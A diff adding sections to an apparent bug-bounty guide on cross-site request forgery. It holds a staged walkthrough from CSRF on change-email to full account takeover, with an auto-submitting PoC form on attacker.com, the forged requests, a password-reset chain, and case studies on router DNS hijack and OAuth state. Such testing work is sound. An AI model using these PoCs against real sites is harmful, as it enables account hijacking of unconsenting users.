@@ -443,6 +443,68 @@ D) Add a passkey / API key / SSH key / OAuth grant:
 
 > **Severity reality:** "CSRF on change-email" with a working real-browser PoC and the reset chain = **High** (often treated as ATO). The same endpoint with SameSite-Lax blocking it = **N/A**. The difference is entirely §4/§19.
 
+## 11.1 The full attack, end-to-end — CSRF → change-email → ATO, start to finish
+
+> *In plain words:* the flagship chain on the wire, with two accounts you own (`A` = attacker, `B` = "victim"). The one thing that makes or breaks a 2026 CSRF is the **SameSite gate** (§4), so this walks it honestly — you'll see *why* the cookie rides along, not just that it does. Every value is benign; once you're inside `B`, you **stop and restore**.
+
+**Stage 0 — Baseline / the SameSite gate (§4 — do this FIRST or you'll report a non-bug).** Log in as `B`, capture the change-email request, and read the cookie flags:
+```http
+GET /account  (as B)
+→ HTTP/2 200
+   Set-Cookie: session=…; Secure; HttpOnly; SameSite=None      ← the decisive line: None = classic cross-site CSRF is LIVE
+```
+```http
+POST /account/email  (the sensitive action)
+Content-Type: application/x-www-form-urlencoded
+Cookie: session=…
+
+email=b@example.com&_=updated
+→ HTTP/2 302 /account        ← no CSRF token param · no X-Requested-With required · accepts urlencoded
+```
+> **Verdict (§4.3):** cookie auth + **`SameSite=None`** + no token + no Origin/Referer check → **strong CSRF, build the ATO chain.** *(If instead you saw `SameSite=Lax` — the modern Chrome default — a cross-site POST would NOT carry the cookie, and you'd pivot to §6: a GET state-change, an on-site redirect gadget, or the 307 trick. That fork is the whole reason Stage 0 exists.)*
+
+**Stage 1 — The PoC page, hosted on a DIFFERENT origin (`https://attacker.com/poc.html`).** CSRF is *cross-site* — serving it from the target's own origin proves nothing (§4.2):
+```html
+<!-- https://attacker.com/poc.html -->
+<form action="https://bank.example/account/email" method="POST">
+  <input type="hidden" name="email" value="attacker-A@evil.com">   <!-- change B's email to an inbox A controls -->
+</form>
+<script>document.forms[0].submit();</script>                         <!-- 0-click: fires on page load -->
+```
+
+**Stage 2 — `B` (logged in, default-settings Chrome) opens the link.** The browser auto-submits, and — because the cookie is `SameSite=None` — attaches `B`'s session to a request it knows is cross-site:
+```http
+POST /account/email HTTP/2
+Host: bank.example
+Origin: https://attacker.com                 ← plainly cross-site…
+Content-Type: application/x-www-form-urlencoded
+Cookie: session=<B's session>                ← …yet the cookie rides along (SameSite=None), and Origin is never checked
+
+email=attacker-A@evil.com&_=updated
+→ HTTP/2 302 /account                         ← B's account email is now the ATTACKER's, no token demanded
+```
+> This is the moment the whole class turns on: under `SameSite=None` the cookie is sent on a cross-site POST; under the default `Lax` it would be withheld here (→ §6 bypass needed). The server also trusted the request despite `Origin: https://attacker.com` — a second, independent failure (§7).
+
+**Stage 3 — `A` completes the takeover (now that `B`'s recovery email is `A`'s inbox):**
+```http
+POST /account/forgot   {"email":"attacker-A@evil.com"}   → reset link delivered to A's inbox (it's B's account)
+POST /account/reset    {"token":"<from A's inbox>","password":"PwnedByCSRF-2026!"}   → 200
+POST /login            {"email":"attacker-A@evil.com","password":"PwnedByCSRF-2026!"} → 200 + inside B's account
+GET  /account          → {"user":"B","email":"attacker-A@evil.com", …}               ← you are inside B
+```
+
+**Stage 4 — Prove it in a REAL default browser, then STOP.** Re-open `poc.html` in **stock Chrome** (no `chrome://flags`, no disabled SameSite) as logged-in `B` and screenshot the email actually changing — that single screenshot is what separates a valid report from an auto-close (§4.2/§19). Restore `B`'s email, and report as **CWE-352, High (ATO)**, `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H`.
+
+**What each stage proved (the transferable arc):**
+```
+Stage 0  SameSite gate   → the cookie is None (or a GET action) → cross-site CSRF is actually possible (the make/break)
+Stage 1  cross-origin PoC → the page lives on attacker.com; a same-origin test would be meaningless
+Stage 2  browser fires it → default-browser, 0-click, cookie attached, Origin ignored = real CSRF (not a Repeater illusion)
+Stage 3  reset chain      → "no CSRF token" upgraded to "I own B's account" — the severity jump from Low to High
+Stage 4  default Chrome    → the validity screenshot that keeps the report open; then restore + stop
+```
+The *same arc* re-skins for every CSRF cash-out: swap Stage 2's form for a **JSON `text/plain`** body (§8/§13), a **GET navigation** under Lax (§6.1), an **on-site redirect gadget** to beat Strict (§6.6), or a **credentialed `fetch`** through a CORS misconfig (§17) — Stages 0/4 (the SameSite gate and the default-browser proof) never change.
+
 ---
 
 # 12. Login CSRF
@@ -518,6 +580,34 @@ fetch('https://target/api/changeEmail', {method:'POST', credentials:'include',
   body:'{"email":"attacker@evil.com"}'});
 ```
 > CORS-with-credentials misconfig turns "well-defended (custom-header) actions" into CSRF-able ones *and* leaks the response. Cross-ref the recon/CORS notes; report as CORS→CSRF/ data-theft. (Requires the dangerous `ACAO:reflected + ACAC:true` combo — verify it.)
+
+---
+
+# Real-world CSRF case studies (learn the pattern, not just the payload)
+
+> Each is a documented class or landmark. Read them for the **shape** — a state-changing request a logged-in victim's browser can be made to send from an attacker's page — and note how the *modern* ones all turn on the SameSite gate (§4).
+
+### Case 1 — SOHO/home-router CSRF → DNS hijack ("drive-by pharming," 2014–2018)
+- **What:** a long, well-documented wave of consumer routers (D-Link, TP-Link, and others) whose web admin panels performed **DNS-server changes via a simple GET/POST with no CSRF token**. A victim merely visiting a malicious page had their router's DNS silently repointed to attacker servers → every device on the network could be pharmed.
+- **Mechanism:** unauthenticated-from-the-LAN, tokenless state change reachable by a forged cross-site request (often a bare `<img>`/`<form>` GET).
+- **Lesson:** CSRF isn't only "change my email" — a tokenless *admin/config* action (router, printer, IoT, internal appliance) is a network-wide compromise, and GET actions are CSRF-able even under SameSite=Lax (§6.1).
+
+### Case 2 — OAuth login/linking CSRF via a missing `state` parameter
+- **What:** the canonical reason the OAuth `state` parameter exists. Without it, an attacker completes an OAuth flow, captures the `code`, and CSRFs the victim into the **callback** — **linking the attacker's identity to the victim's session** (or logging the victim into the attacker's account, §12) → account hijack or silent data capture.
+- **Mechanism:** the callback is a state-changing request (account link / session establish) with no anti-CSRF value binding it to the user's own flow.
+- **Lesson:** every OAuth/SSO callback and "link social account" action must carry an unguessable `state`; its absence is CSRF → ATO (§15, cross-ref the OAuth kit).
+
+### Case 3 — Chrome 80 `SameSite=Lax`-by-default (Feb 2020): the landmark that reshaped the class
+- **What:** browsers flipping the default cookie policy to `SameSite=Lax` **retired most classic cross-site POST CSRF overnight** — a cross-site `POST` no longer carries the victim's cookie unless the site explicitly sets `SameSite=None`.
+- **Mechanism:** the browser, not the app, now withholds the cookie on cross-site sub-requests by default.
+- **Lesson:** this is *why* §4's SameSite gate is mandatory and why so many "CSRF" reports are now auto-closed. Modern CSRF lives in the **gaps**: `SameSite=None` cookies, **GET** state-changes (Lax still sends those on top-level navigation), the **2-minute Lax+POST** legacy window, **on-site redirect/routing gadgets**, and **same-site position** (§6). Report only what fires in a **default** browser.
+
+### Case 4 — Change-email / change-password / disable-2FA CSRF → account takeover (the everyday bounty)
+- **What:** a recurring HackerOne-disclosed pattern across many programs — a sensitive account action (change recovery email, set a new password without the old one, disable 2FA, add an API/SSH key) protected by cookies **without** a validated CSRF token (or with a bypassable one), on a `SameSite=None` cookie.
+- **Mechanism:** exactly §11.1 — CSRF the identity/credential change, then complete the reset → ATO.
+- **Lesson:** aim CSRF at the **account-defining** action, prove the full chain in a default browser, and report the *takeover*, not the missing token — the same request, an order of magnitude more severity (§11, §18).
+
+> **The through-line:** the reported finding is the **impact** (DNS hijack, ATO, account-link), the missing token is only the *mechanism*, and every modern one is gated by SameSite — which is why you baseline it first and prove it in a stock browser (§4, §19).
 
 ---
 
